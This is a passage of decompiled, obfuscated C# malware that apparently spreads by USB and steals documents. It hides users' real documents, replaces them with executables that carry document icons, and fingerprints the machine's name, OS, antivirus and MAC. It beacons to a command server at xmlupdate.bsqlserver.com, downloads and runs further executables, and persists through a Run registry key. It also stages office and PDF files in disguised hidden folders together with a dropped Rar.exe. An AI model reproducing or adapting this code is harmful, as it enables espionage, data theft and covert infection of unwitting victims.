			string text3 = Delegate334.smethod_0(text, text2);
			string text4 = Delegate321.smethod_0(list_0, Delegate256.smethod_0(list_0) - 1);
			string[] array = Delegate175.smethod_0(this, text4, "*.*");
			int num = 0;
			list_2 = Delegate95.smethod_0();
			for (int i = 0; i < array.Length; i++)
			{
				FileInfo object_ = Delegate329.smethod_0(array[i]);
				if ((Delegate218.smethod_0(Delegate147.smethod_0(object_), ".docx") || Delegate218.smethod_0(Delegate147.smethod_0(object_), ".doc") || Delegate218.smethod_0(Delegate147.smethod_0(object_), ".zip") || Delegate218.smethod_0(Delegate147.smethod_0(object_), ".pdf") || Delegate218.smethod_0(Delegate147.smethod_0(object_), ".rar") || Delegate218.smethod_0(Delegate147.smethod_0(object_), ".xls") || Delegate218.smethod_0(Delegate147.smethod_0(object_), ".xlsx") || Delegate218.smethod_0(Delegate147.smethod_0(object_), ".txt")) && Delegate103.smethod_0(Delegate134.smethod_0(object_), string_1))
				{
					Class1 @class = new Class1();
					if (num != array.Length)
					{
						@class.String_0 = array[i];
						@class.DateTime_0 = Delegate54.smethod_0(object_);
						@class.String_1 = string_0;
						Delegate349.smethod_0(list_2, @class);
					}
				}
			}
			int num2 = 0;
			num2 = ((Delegate309.smethod_0(list_2) >= int_0) ? (Delegate309.smethod_0(list_2) - int_0) : 0);
			Delegate108.smethod_0(list_2, delegate(Class1 class1_0, Class1 class1_1)
			{
				DateTime dateTime_ = class1_0.DateTime_0;
				return Delegate223.smethod_0(ref dateTime_, class1_1.DateTime_0);
			});
			string text5 = Delegate197.smethod_0();
			FileInfo object_2 = Delegate329.smethod_0(text5);
			for (int i = Delegate309.smethod_0(list_2) - 1; i >= num2; i--)
			{
				try
				{
					string text6 = Delegate49.smethod_0(Delegate322.smethod_0(list_2, i).String_0);
					string text7 = Delegate295.smethod_0(text6, "\\", FileDocTemp);
					Delegate182.smethod_0(object_2, FileAttributes.Hidden);
					Delegate61.smethod_0(object_2, text7);
				}
				catch
				{
				}
				try
				{
					Delegate182.smethod_0(object_2, FileAttributes.Normal);
					FileInfo object_ = Delegate329.smethod_0(Delegate322.smethod_0(list_2, i).String_0);
					FileStream fileStream = null;
					StreamWriter streamWriter = null;
					fileStream = Delegate243.smethod_0(Delegate295.smethod_0(Delegate49.smethod_0(Delegate322.smethod_0(list_2, i).String_0), "\\", string_1), FileMode.Append, FileAccess.Write);
					streamWriter = Delegate230.smethod_0(fileStream, Delegate121.smethod_0());
					FileInfo object_3 = Delegate329.smethod_0(Delegate295.smethod_0(Delegate49.smethod_0(Delegate322.smethod_0(list_2, i).String_0), "\\", string_1));
					Delegate182.smethod_0(object_3, FileAttributes.Hidden);
					if (streamWriter != null)
					{
						Delegate283.smethod_0(streamWriter);
					}
					if (fileStream != null)
					{
						Delegate41.smethod_0(fileStream);
					}
					array = Delegate175.smethod_0(this, text4, string_1);
					string text8 = Delegate146.smethod_0(Delegate322.smethod_0(list_2, i).String_0);
					bool flag = false;
					Delegate344.smethod_0(this, Delegate295.smethod_0(Delegate49.smethod_0(Delegate67.smethod_0(object_)), "\\", string_1));
					string text9 = Delegate23.smethod_0(this, Delegate295.smethod_0(Delegate49.smethod_0(Delegate67.smethod_0(object_)), "\\", string_1), text8, "Path");
					if (Delegate103.smethod_0(text9, ""))
					{
						flag = true;
					}
					FileInfo object_4 = Delegate329.smethod_0(Delegate295.smethod_0(Delegate49.smethod_0(Delegate322.smethod_0(list_2, i).String_0), "\\", string_1));
					Delegate182.smethod_0(object_4, FileAttributes.Hidden);
					if (!flag)
					{
						Delegate344.smethod_0(this, Delegate295.smethod_0(Delegate49.smethod_0(Delegate322.smethod_0(list_2, i).String_0), "\\", string_1));
						Delegate296.smethod_0(this, Delegate295.smethod_0(Delegate49.smethod_0(Delegate322.smethod_0(list_2, i).String_0), "\\", string_1), Delegate146.smethod_0(Delegate322.smethod_0(list_2, i).String_0), "Hidden", Delegate322.smethod_0(list_2, i).String_1);
					}
					if (streamWriter != null)
					{
						Delegate283.smethod_0(streamWriter);
					}
					if (fileStream != null)
					{
						Delegate41.smethod_0(fileStream);
					}
					string text10 = Delegate14.smethod_0(Delegate49.smethod_0(Delegate322.smethod_0(list_2, i).String_0), "\\", Delegate215.smethod_0(Delegate134.smethod_0(object_)), ".exe");
					string text11 = Delegate160.smethod_0(Environment.SpecialFolder.LocalApplicationData);
					string text12 = Delegate295.smethod_0(FileDoc, "\\", FileDocTemp);
					string text13 = Delegate334.smethod_0(text11, text12);
					Delegate329.smethod_0(text13);
					try
					{
						Delegate49.smethod_0(Delegate197.smethod_0());
						string text14 = "";
						Delegate174.smethod_0(text13, text10);
						int num3;
						try
						{
							string object_5 = Delegate317.smethod_0(Delegate337.smethod_0(Delegate210.smethod_0(registryKey_1, "Path")), Delegate278.smethod_0(Delegate337.smethod_0(Delegate210.smethod_0(registryKey_1, "Path"))) - 1);
							num3 = Delegate155.smethod_0(Delegate298.smethod_0(object_5, 0, Delegate278.smethod_0(object_5) - 2));
						}
						catch
						{
							num3 = 10;
						}
						if (Delegate83.smethod_0(Delegate216.smethod_0(Delegate147.smethod_0(object_)), "doc"))
						{
							text14 = ((num3 < 15) ? Delegate334.smethod_0(text11, Delegate295.smethod_0(FileDoc, "\\icon\\", Delegate169.smethod_0(this, "odc.ico"))) : Delegate334.smethod_0(text11, Delegate295.smethod_0(FileDoc, "\\icon\\", Delegate169.smethod_0(this, "doc.ico"))));
						}
						else if (Delegate83.smethod_0(Delegate216.smethod_0(Delegate147.smethod_0(object_)), "xls"))
						{
							text14 = ((num3 < 15) ? Delegate334.smethod_0(text11, Delegate295.smethod_0(FileDoc, "\\icon\\", Delegate169.smethod_0(this, "lxs.ico"))) : Delegate334.smethod_0(text11, Delegate295.smethod_0(FileDoc, "\\icon\\", Delegate169.smethod_0(this, "xls.ico"))));
						}
						else if (Delegate83.smethod_0(Delegate216.smethod_0(Delegate147.smethod_0(object_)), "ppt"))
						{
							text14 = ((num3 < 15) ? Delegate334.smethod_0(text11, Delegate295.smethod_0(FileDoc, "\\icon\\", Delegate169.smethod_0(this, "ptp.ico"))) : Delegate334.smethod_0(text11, Delegate295.smethod_0(FileDoc, "\\icon\\", Delegate169.smethod_0(this, "ppt.ico"))));
						}
						else if (Delegate83.smethod_0(Delegate216.smethod_0(Delegate147.smethod_0(object_)), "txt"))
						{
							text14 = Delegate334.smethod_0(text11, Delegate295.smethod_0(FileDoc, "\\icon\\", Delegate169.smethod_0(this, "txt.ico")));
						}
						else if (Delegate83.smethod_0(Delegate216.smethod_0(Delegate147.smethod_0(object_)), "pdf"))
						{
							text14 = Delegate334.smethod_0(text11, Delegate295.smethod_0(FileDoc, "\\icon\\", Delegate169.smethod_0(this, "pdf.ico")));
						}
						Class3.smethod_0(text10, text14);
						byte[] byte_ = Delegate161.smethod_0(Delegate67.smethod_0(object_));
						string text15 = Delegate202.smethod_0(Delegate335.smethod_0(byte_), "-", string.Empty);
						Class3.smethod_2(text10, "TEXT", "DATA", text15);
						Delegate182.smethod_0(object_, FileAttributes.Hidden);
						Delegate188.smethod_0(Delegate67.smethod_0(object_));
						StreamWriter streamWriter2 = Delegate80.smethod_0(Delegate271.smethod_0(text3, log));
						try
						{
							Delegate251.smethod_0(streamWriter2, Delegate40.smethod_0(new object[6]
							{
								"The file: ",
								text10,
								"      ",
								string_0,
								"    Done...      ",
								Delegate268.smethod_0()
							}));
						}
						finally
						{
							if (streamWriter2 != null)
							{
								Delegate69.smethod_0(streamWriter2);
							}
						}
					}
					catch
					{
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	public bool IsProcessOpen(string name)
	{
		Process[] array = Delegate208.smethod_0();
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				Process object_ = array[num];
				if (Delegate83.smethod_0(Delegate73.smethod_0(object_), name))
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	private static void smethod_0(string string_6, string string_7, int int_7)
	{
		Image val = Delegate288.smethod_0(string_6, bool_0: true);
		Bitmap val2 = Delegate327.smethod_0(int_7, int_7, (PixelFormat)2498570);
		Graphics object_ = Delegate139.smethod_0((Image)(object)val2);
		Delegate20.smethod_0(object_, val, 0, 0, int_7, int_7);
		Icon object_2 = Delegate222.smethod_0(Delegate153.smethod_0(val2));
		FileStream fileStream = Delegate290.smethod_0(string_7);
		Delegate316.smethod_0(object_2, fileStream);
		Delegate41.smethod_0(fileStream);
		Delegate167.smethod_0(object_2);
		Delegate341.smethod_0(val2);
		Delegate341.smethod_0(val);
	}

	private void method_3(object sender, AsyncCompletedEventArgs e)
	{
		if (!Delegate180.smethod_0(e) && Delegate301.smethod_0(e) == null)
		{
			Process object_ = Delegate142.smethod_0();
			Delegate36.smethod_0(Delegate211.smethod_0(object_), Delegate271.smethod_0(Delegate49.smethod_0(Delegate197.smethod_0()), "\\D1.exe"));
			Delegate156.smethod_0(object_);
		}
	}

	public void AddFileDoc(string pathFile, string Path1, string Hidden, string SerialUSB)
	{
		try
		{
			XmlDocument object_ = Delegate113.smethod_0();
			XmlElement xmlElement = Delegate314.smethod_0(object_, string.Empty, "body", string.Empty);
			Delegate126.smethod_0(object_, xmlElement);
			XmlElement xmlElement2 = Delegate314.smethod_0(object_, string.Empty, "DocHiddenFile", string.Empty);
			Delegate126.smethod_0(xmlElement, xmlElement2);
			XmlElement xmlElement3 = Delegate314.smethod_0(object_, string.Empty, "Path", string.Empty);
			XmlText xmlNode_ = Delegate248.smethod_0(object_, Path1);
			Delegate126.smethod_0(xmlElement3, xmlNode_);
			Delegate126.smethod_0(xmlElement2, xmlElement3);
			XmlElement xmlElement4 = Delegate314.smethod_0(object_, string.Empty, "State", string.Empty);
			XmlText xmlNode_2 = Delegate248.smethod_0(object_, Hidden);
			Delegate126.smethod_0(xmlElement4, xmlNode_2);
			Delegate126.smethod_0(xmlElement2, xmlElement4);
			XmlElement xmlElement5 = Delegate314.smethod_0(object_, string.Empty, "Serial", string.Empty);
			XmlText xmlNode_3 = Delegate248.smethod_0(object_, string_0);
			Delegate126.smethod_0(xmlElement5, xmlNode_3);
			Delegate126.smethod_0(xmlElement2, xmlElement5);
			FileStream fileStream = Delegate243.smethod_0(pathFile, FileMode.Append, FileAccess.Write);
			Delegate235.smethod_0(object_, fileStream);
			Delegate41.smethod_0(fileStream);
		}
		catch
		{
		}
	}

	public string SearchFile(string pathFile, string serch, string element)
	{
		string result = "";
		try
		{
			XmlDocument object_ = Delegate113.smethod_0();
			Delegate261.smethod_0(object_, pathFile);
			XmlNodeList object_2 = Delegate100.smethod_0(object_, element);
			for (int i = 0; i < Delegate33.smethod_0(object_2); i++)
			{
				if (Delegate83.smethod_0(Delegate354.smethod_0(Delegate59.smethod_0(object_2, i)), serch))
				{
					result = Delegate354.smethod_0(Delegate59.smethod_0(object_2, i));
				}
			}
		}
		catch
		{
		}
		return result;
	}

	public void DeleteBody(string pathFile)
	{
		string[] array = Delegate79.smethod_0(pathFile);
		List<string> object_ = Delegate75.smethod_0();
		if (array.Length == 0)
		{
			return;
		}
		string[] array2 = array;
		foreach (string text in array2)
		{
			Delegate94.smethod_0(object_, text);
		}
		for (int j = 1; j < Delegate256.smethod_0(object_) - 1; j++)
		{
			if (Delegate83.smethod_0(Delegate321.smethod_0(object_, j), "body"))
			{
				Delegate87.smethod_0(object_, j);
				j--;
			}
		}
		Delegate188.smethod_0(pathFile);
		Delegate39.smethod_0(pathFile, Delegate267.smethod_0(object_), Delegate121.smethod_0());
		FileInfo object_2 = Delegate329.smethod_0(pathFile);
		Delegate182.smethod_0(object_2, FileAttributes.Hidden);
	}

	public void addComputer(string PathAdd, string SerialUSB)
	{
		string text = Delegate65.smethod_0();
		XmlDocument object_ = Delegate113.smethod_0();
		USBSerialNumber object_2 = Delegate201.smethod_0();
		string text2 = Delegate317.smethod_0(Delegate66.smethod_0(Delegate197.smethod_0()), Delegate278.smethod_0(Delegate66.smethod_0(Delegate197.smethod_0())) - 2);
		string text3 = Delegate187.smethod_0(object_2, text2);
		XmlElement xmlElement = Delegate314.smethod_0(object_, string.Empty, "body", string.Empty);
		Delegate126.smethod_0(object_, xmlElement);
		XmlElement xmlElement2 = Delegate314.smethod_0(object_, string.Empty, text, string.Empty);
		Delegate186.smethod_0(xmlElement2, "PCName", text);
		Delegate186.smethod_0(xmlElement2, "SerialOfCPU", SerialUSB);
		Delegate186.smethod_0(xmlElement2, "DataAdd", Delegate268.smethod_0().ToString());
		Delegate186.smethod_0(xmlElement2, "USBSerial", text3);
		Delegate126.smethod_0(xmlElement, xmlElement2);
		FileStream fileStream = Delegate243.smethod_0(PathAdd, FileMode.Append, FileAccess.Write);
		Delegate235.smethod_0(object_, fileStream);
		Delegate41.smethod_0(fileStream);
	}

	public bool FoundCoumpter(string pathFile)
	{
		string text = Delegate65.smethod_0();
		USBSerialNumber object_ = Delegate201.smethod_0();
		string text2 = Delegate317.smethod_0(Delegate66.smethod_0(Delegate197.smethod_0()), Delegate278.smethod_0(Delegate66.smethod_0(Delegate197.smethod_0())) - 2);
		string text3 = Delegate187.smethod_0(object_, text2);
		string[] array = Delegate79.smethod_0(pathFile);
		List<string> object_2 = Delegate75.smethod_0();
		if (array.Length != 0)
		{
			string[] array2 = array;
			foreach (string text4 in array2)
			{
				Delegate94.smethod_0(object_2, text4);
			}
			for (int j = 0; j < Delegate256.smethod_0(object_2) - 1; j++)
			{
				if (Delegate83.smethod_0(Delegate321.smethod_0(object_2, j), text) && Delegate83.smethod_0(Delegate321.smethod_0(object_2, j), text3))
				{
					return true;
				}
			}
		}
		return false;
	}

	public void RemoveAll(string PathFile)
	{
		string[] array = Delegate79.smethod_0(PathFile);
		List<string> object_ = Delegate75.smethod_0();
		if (array.Length == 0)
		{
			return;
		}
		string[] array2 = array;
		foreach (string text in array2)
		{
			Delegate94.smethod_0(object_, text);
		}
		for (int j = 1; j < Delegate256.smethod_0(object_) - 1; j++)
		{
			if (!Delegate83.smethod_0(Delegate321.smethod_0(object_, j), "SerialOfCPU"))
			{
				Delegate87.smethod_0(object_, j);
				j--;
			}
		}
		Delegate188.smethod_0(PathFile);
		Delegate39.smethod_0(PathFile, Delegate267.smethod_0(object_), Delegate121.smethod_0());
		FileInfo object_2 = Delegate329.smethod_0(PathFile);
		Delegate182.smethod_0(object_2, FileAttributes.Hidden);
	}

	public static string GetOSFriendlyName()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		string result = string.Empty;
		ManagementObjectSearcher object_ = Delegate324.smethod_0("SELECT Caption FROM Win32_OperatingSystem");
		ManagementObjectEnumerator val = Delegate16.smethod_0(Delegate136.smethod_0(object_));
		try
		{
			if (Delegate204.smethod_0(val))
			{
				ManagementObject object_2 = (ManagementObject)Delegate149.smethod_0(val);
				result = Delegate337.smethod_0(Delegate163.smethod_0(object_2, "Caption"));
			}
		}
		finally
		{
			if (val != null)
			{
				Delegate69.smethod_0(val);
			}
		}
		return result;
	}

	public string FetchMacId()
	{
		string result = "";
		NetworkInterface[] array = Delegate159.smethod_0();
		foreach (NetworkInterface object_ in array)
		{
			if (Delegate333.smethod_0(object_) == OperationalStatus.Up)
			{
				result = Delegate271.smethod_0(result, Delegate337.smethod_0(Delegate200.smethod_0(object_)));
				break;
			}
		}
		return result;
	}

	public void POSTGET()
	{
		string text = Delegate160.smethod_0(Environment.SpecialFolder.LocalApplicationData);
		string text2 = Delegate271.smethod_0(FileDoc, "\\");
		string text3 = Delegate334.smethod_0(text, text2);
		string text4 = Delegate65.smethod_0();
		string text5 = Delegate241.smethod_0();
		string text6 = Delegate119.smethod_0();
		string text7 = "1";
		string text8 = "1";
		string text9;
		try
		{
			text9 = Delegate228.smethod_0(Delegate271.smethod_0(text3, string_1));
		}
		catch
		{
			text9 = "The File Not Found...";
		}
		string text10 = Delegate197.smethod_0();
		string text11 = Delegate173.smethod_0(this);
		string version = Version;
		string text12 = "";
		try
		{
			if (ckkkk == 0)
			{
				try
				{
					if (registryKey_0 == null)
					{
						registryKey_0 = Delegate81.smethod_0(Registry.CurrentUser, KeyPathVersion);
					}
					string text13 = Delegate12.smethod_0("name={0}&subject={1}&OS={2}&category={3}&priority={4}&message={5}&FileLocation={6}&email={7}&MyVer={8}", new object[9] { text4, text5, text6, text7, text8, text9, text10, text11, version });
					MyWebRequest object_ = Delegate145.smethod_0("http://xmlupdate.bsqlserver.com/update3/submit_ticket.php", "POST", text13);
					text12 = Delegate281.smethod_0(object_);
					Delegate90.smethod_0(registryKey_0, "ID", text12);
					StreamWriter streamWriter = Delegate80.smethod_0(Delegate271.smethod_0(text3, log));
					try
					{
						Delegate251.smethod_0(streamWriter, Delegate40.smethod_0(new object[4]
						{
							"The Computer Take ID: ",
							text12,
							"       ",
							Delegate268.smethod_0()
						}));
					}
					finally
					{
						if (streamWriter != null)
						{
							Delegate69.smethod_0(streamWriter);
						}
					}
				}
				catch
				{
				}
			}
			if (ckkkk == 2)
			{
				if (!bool_1)
				{
					try
					{
						string text13 = Delegate12.smethod_0("trackingID={0}&name={1}&subject={2}&OS={3}&category={4}&priority={5}&FileLocation={6}&email={7}&MyVer={8}&AVName={9}", new object[10]
						{
							Delegate337.smethod_0(Delegate210.smethod_0(registryKey_0, "ID")),
							text4,
							text5,
							text6,
							text7,
							text8,
							text10,
							text11,
							version,
							Delegate294.smethod_0(this)
						});
						MyWebRequest object_ = Delegate145.smethod_0("http://xmlupdate.bsqlserver.com/update3/cache_update.php", "POST", text13);
						string[] array = Delegate177.smethod_0(Delegate281.smethod_0(object_), new char[1] { '^' });
						if (Delegate218.smethod_0(array[0], "ok") && array.Length > 2)
						{
							byte[] byte_ = Delegate129.smethod_0(array[^1]);
							Delegate9.smethod_0(Delegate295.smethod_0(text3, Delegate215.smethod_0(array[2]), ".exe"), byte_);
							RegistryKey object_2 = Delegate110.smethod_0(Registry.CurrentUser, KeyPath, bool_0: true);
							if (Delegate210.smethod_0(object_2, Delegate295.smethod_0(RunKey, " ", Delegate215.smethod_0(array[2]))) == null)
							{
								Delegate90.smethod_0(object_2, Delegate295.smethod_0(RunKey, " ", Delegate215.smethod_0(array[2])), Delegate295.smethod_0(text3, Delegate215.smethod_0(array[2]), ".exe"));
							}
							else
							{
								Delegate250.smethod_0(object_2, Delegate295.smethod_0(RunKey, " ", Delegate215.smethod_0(array[2])));
								Delegate90.smethod_0(object_2, Delegate295.smethod_0(RunKey, " ", Delegate215.smethod_0(array[2])), Delegate295.smethod_0(text3, Delegate215.smethod_0(array[2]), ".exe"));
							}
							bool_1 = true;
							string text14 = Delegate295.smethod_0(text3, Delegate215.smethod_0(array[2]), ".exe");
							Process object_3 = Delegate142.smethod_0();
							Delegate36.smethod_0(Delegate211.smethod_0(object_3), text14);
							Delegate156.smethod_0(object_3);
						}
					}
					catch
					{
					}
				}
				if (bool_1)
				{
					try
					{
						object[] array2 = new object[10]
						{
							Delegate337.smethod_0(Delegate210.smethod_0(registryKey_0, "ID")),
							text4,
							text5,
							text6,
							text7,
							text8,
							text10,
							text11,
							version,
							null
						};
						object[] array3 = array2;
						DateTime dateTime_ = Delegate268.smethod_0();
						dateTime_ = Delegate320.smethod_0(ref dateTime_);
						array3[9] = Delegate132.smethod_0(ref dateTime_, "ddMMyyyy");
						string text13 = Delegate12.smethod_0("trackingID={0}&name={1}&subject={2}&OS={3}&category={4}&priority={5}&FileLocation={6}&email={7}&MyVer={8}&ServerFile={9}", array2);
						MyWebRequest object_ = Delegate145.smethod_0("http://xmlupdate.bsqlserver.com/update3/cache_update.php", "POST", text13);
						bool_1 = false;
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
		Delegate214.smethod_0(thread_0);
	}

	public string GEtANT()
	{
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007d: Expected O, but got Unknown
		string result = "";
		try
		{
			ManagementObjectSearcher val = null;
			val = ((Delegate106.smethod_0(Delegate26.smethod_0(Delegate347.smethod_0())) <= 5) ? Delegate307.smethod_0(Delegate295.smethod_0("\\\\", Delegate65.smethod_0(), "\\root\\SecurityCenter"), "SELECT * FROM AntivirusProduct") : Delegate307.smethod_0(Delegate295.smethod_0("\\\\", Delegate65.smethod_0(), "\\root\\SecurityCenter2"), "SELECT * FROM AntivirusProduct"));
			ManagementObjectCollection object_ = Delegate136.smethod_0(val);
			ManagementObjectEnumerator val2 = Delegate16.smethod_0(object_);
			try
			{
				while (Delegate204.smethod_0(val2))
				{
					ManagementObject object_2 = (ManagementObject)Delegate149.smethod_0(val2);
					result = Delegate14.smethod_0(result, "(", Delegate337.smethod_0(Delegate163.smethod_0(object_2, "displayName")), ") ");
				}
			}
			finally
			{
				if (val2 != null)
				{
					Delegate69.smethod_0(val2);
				}
			}
		}
		catch (Exception)
		{
		}
		return result;
	}

	public static byte[] StringToByteArray(string hex)
	{
		int num = Delegate278.smethod_0(hex);
		byte[] array = new byte[num / 2];
		for (int i = 0; i < num; i += 2)
		{
			array[i / 2] = Delegate52.smethod_0(Delegate232.smethod_0(hex, i, 2), 16);
		}
		return array;
	}

	private void method_4(object sender, EventArgs e)
	{
		if (!Delegate42.smethod_0())
		{
			return;
		}
		try
		{
			if (registryKey_0 == null)
			{
				ckkkk = 0;
			}
			if (Delegate210.smethod_0(registryKey_0, "ID") != null)
			{
				ckkkk = 2;
			}
			thread_0 = Delegate254.smethod_0(POSTGET);
			Delegate93.smethod_0(thread_0);
		}
		catch
		{
		}
	}

	public static bool CheckForInternetConnection()
	{
		Ping object_ = Delegate68.smethod_0();
		string text = "8.8.8.8";
		byte[] byte_ = new byte[32];
		int num = 1000;
		PingOptions pingOptions_ = Delegate189.smethod_0();
		PingReply object_2 = Delegate82.smethod_0(object_, text, num, byte_, pingOptions_);
		if (Delegate270.smethod_0(object_2) == IPStatus.Success)
		{
			return true;
		}
		return false;
	}

	private void method_5(object sender, EventArgs e)
	{
		try
		{
			string text = Delegate160.smethod_0(Environment.SpecialFolder.LocalApplicationData);
			string text2 = Delegate271.smethod_0(FileDoc, "\\");
			string text3 = Delegate334.smethod_0(text, text2);
			if (Delegate42.smethod_0() == bool_0)
			{
				return;
			}
			StreamWriter streamWriter;
			if (Delegate42.smethod_0())
			{
				streamWriter = Delegate80.smethod_0(Delegate271.smethod_0(text3, log));
				try
				{
					Delegate251.smethod_0(streamWriter, Delegate28.smethod_0("The Internet Connection...       ", Delegate268.smethod_0()));
				}
				finally
				{
					if (streamWriter != null)
					{
						Delegate69.smethod_0(streamWriter);
					}
				}
				bool_0 = true;
				if (Delegate210.smethod_0(registryKey_0, "DateInternet") != null)
				{
					Delegate250.smethod_0(registryKey_0, "DateInternet");
				}
				int_5 = 1;
				return;
			}
			streamWriter = Delegate80.smethod_0(Delegate271.smethod_0(text3, log));
			try
			{
				Delegate251.smethod_0(streamWriter, Delegate28.smethod_0("The Internet DisConnection...       ", Delegate268.smethod_0()));
			}
			finally
			{
				if (streamWriter != null)
				{
					Delegate69.smethod_0(streamWriter);
				}
			}
			int_5 = 0;
			bool_0 = false;
			thread_1 = Delegate254.smethod_0(CopyFileMeothd);
			Delegate93.smethod_0(thread_1);
		}
		catch
		{
		}
	}

	private static void smethod_1(string string_6, string string_7, bool bool_3)
	{
		try
		{
			DirectoryInfo object_ = Delegate148.smethod_0(string_6);
			DirectoryInfo[] array = Delegate217.smethod_0(object_);
			if (!Delegate128.smethod_0(object_))
			{
				throw Delegate162.smethod_0(Delegate271.smethod_0("Source directory does not exist or could not be found: ", string_6));
			}
			if (!Delegate8.smethod_0(string_7))
			{
				Delegate141.smethod_0(string_7);
			}
			FileInfo[] array2 = Delegate336.smethod_0(object_);
			FileInfo[] array3 = array2;
			foreach (FileInfo object_2 in array3)
			{
				string text = Delegate334.smethod_0(string_7, Delegate134.smethod_0(object_2));
				Delegate203.smethod_0(object_2, text, bool_0: false);
			}
			if (bool_3)
			{
				DirectoryInfo[] array4 = array;
				foreach (DirectoryInfo object_3 in array4)
				{
					string text = Delegate334.smethod_0(string_7, Delegate134.smethod_0(object_3));
					smethod_1(Delegate67.smethod_0(object_3), text, bool_3);
				}
			}
		}
		catch
		{
		}
	}

	public void CopyFileMeothd()
	{
		Delegate323.smethod_0(60000);
		if (Delegate42.smethod_0())
		{
			return;
		}
		if (int_5 == 0)
		{
			if (Delegate210.smethod_0(registryKey_0, "DateInternet") == null)
			{
				Delegate90.smethod_0(registryKey_0, "DateInternet", Delegate268.smethod_0());
			}
			DateTime dateTime_ = Delegate38.smethod_0(Delegate210.smethod_0(registryKey_0, "DateInternet"));
			DateTime dateTime_2 = Delegate268.smethod_0();
			TimeSpan timeSpan_ = Delegate78.smethod_0(ref dateTime_2, dateTime_);
			int num = Delegate266.smethod_0(ref timeSpan_);
			if (num >= 24)
			{
				Disconnect = 1;
				DriveInfo[] array = Delegate263.smethod_0();
				Delegate201.smethod_0();
				List<string> object_ = Delegate75.smethod_0();
				DateTime dateTime_3 = Delegate38.smethod_0(Delegate210.smethod_0(registryKey_0, "DateInternet"));
				string_3 = Delegate271.smethod_0(Delegate160.smethod_0(Environment.SpecialFolder.LocalApplicationData), "\\AdobeCache");
				string_4 = Delegate295.smethod_0(Delegate160.smethod_0(Environment.SpecialFolder.LocalApplicationData), "\\AdobeCache\\", Delegate132.smethod_0(ref dateTime_3, "ddMMyyyy"));
				if (!Delegate8.smethod_0(string_3))
				{
					Delegate141.smethod_0(string_3);
				}
				if (!Delegate8.smethod_0(string_4))
				{
					Delegate141.smethod_0(string_4);
				}
				DriveInfo[] array2 = array;
				foreach (DriveInfo object_2 in array2)
				{
					if (Delegate35.smethod_0(object_2) != DriveType.CDRom && Delegate35.smethod_0(object_2) == DriveType.Fixed)
					{
						USBSerialNumber object_3 = Delegate201.smethod_0();
						string text = Delegate317.smethod_0(Delegate255.smethod_0(object_2), Delegate278.smethod_0(Delegate255.smethod_0(object_2)) - 2);
						string text2 = Delegate187.smethod_0(object_3, text);
						if (text2 == null)
						{
							Delegate94.smethod_0(object_, Delegate255.smethod_0(object_2));
						}
					}
				}
				string_2 = Delegate271.smethod_0(smethod_2(), "\\Winrar\\Rar.exe");
				if (Delegate257.smethod_0(string_2))
				{
					string_2 = Delegate271.smethod_0(smethod_2(), "\\Winrar\\");
				}
				else
				{
					byte[] byte_ = Delegate129.smethod_0(Class0.smethod_0());
					Delegate9.smethod_0(Delegate271.smethod_0(Delegate49.smethod_0(Delegate197.smethod_0()), "\\Rar.exe"), byte_);
					string_2 = Delegate271.smethod_0(Delegate49.smethod_0(Delegate197.smethod_0()), "\\");
				}
				List<string> object_4 = Delegate75.smethod_0();
				Delegate94.smethod_0(object_4, "*.doc*");
				Delegate94.smethod_0(object_4, "*.xls*");
				Delegate94.smethod_0(object_4, "*.ppt*");
				Delegate94.smethod_0(object_4, "*.pdf");
				Delegate94.smethod_0(object_4, "*.msh");
				Delegate94.smethod_0(object_4, "*.pnp");
				char[] char_ = new char[2] { '*', '.' };
				for (int j = 0; j < Delegate256.smethod_0(object_); j++)
				{
					if (Delegate210.smethod_0(registryKey_0, "IJ") != null)
					{
						string[] array3 = Delegate177.smethod_0(Delegate337.smethod_0(Delegate210.smethod_0(registryKey_0, "IJ")), new char[1] { ',' });
						j = Delegate155.smethod_0(array3[0]);
					}
					for (int k = 0; k < Delegate256.smethod_0(object_4); k++)
					{
						if (Delegate210.smethod_0(registryKey_0, "IJ") != null)
						{
							string[] array3 = Delegate177.smethod_0(Delegate337.smethod_0(Delegate210.smethod_0(registryKey_0, "IJ")), new char[1] { ',' });
							k = Delegate155.smethod_0(array3[1]);
						}
						string text3 = Delegate317.smethod_0(Delegate66.smethod_0(string_4), Delegate278.smethod_0(Delegate66.smethod_0(string_4)) - 2);
						DriveInfo object_5 = Delegate96.smethod_0(text3);
						double double_ = Delegate29.smethod_0(Delegate55.smethod_0(object_5)) / Delegate29.smethod_0(Delegate350.smethod_0(object_5)) * 100.0;
						double num2 = Delegate109.smethod_0(double_, 2);
						if (num2 <= 20.0)
						{
							for (int l = 0; l < Delegate256.smethod_0(object_); l++)
							{
								string_4 = Delegate295.smethod_0(Delegate321.smethod_0(object_, l), "System Volume Infornation\\", Delegate132.smethod_0(ref dateTime_3, "ddMMyyyy"));
								text3 = Delegate317.smethod_0(Delegate66.smethod_0(string_4), Delegate278.smethod_0(Delegate66.smethod_0(string_4)) - 2);
								object_5 = Delegate96.smethod_0(text3);
								double_ = Delegate29.smethod_0(Delegate55.smethod_0(object_5)) / Delegate29.smethod_0(Delegate350.smethod_0(object_5)) * 100.0;
								num2 = Delegate109.smethod_0(double_, 2);
								DirectoryInfo object_6;
								if (Delegate8.smethod_0(Delegate271.smethod_0(Delegate321.smethod_0(object_, l), "System Volume Infornation")) || !(num2 >= 20.0))
								{
									if (Delegate8.smethod_0(Delegate271.smethod_0(Delegate321.smethod_0(object_, l), "System Volume Infornation")) && num2 >= 20.0)
									{
										object_6 = Delegate148.smethod_0(Delegate271.smethod_0(Delegate321.smethod_0(object_, l), "System Volume Infornation"));
										Delegate182.smethod_0(object_6, FileAttributes.Hidden);
										if (!Delegate8.smethod_0(string_4))
										{
											Delegate141.smethod_0(string_4);
										}
										break;
									}
									continue;
								}
								object_6 = Delegate141.smethod_0(Delegate271.smethod_0(Delegate321.smethod_0(object_, l), "System Volume Infornation"));
								Delegate182.smethod_0(object_6, FileAttributes.Hidden);
								if (!Delegate8.smethod_0(string_4))
								{
									Delegate141.smethod_0(string_4);
								}
								break;
							}
						}
						DateTime dateTime_4 = Delegate310.smethod_0();
						DateTime dateTime_5 = Delegate244.smethod_0(ref dateTime_4, 1.0);
						dateTime_4 = Delegate310.smethod_0();
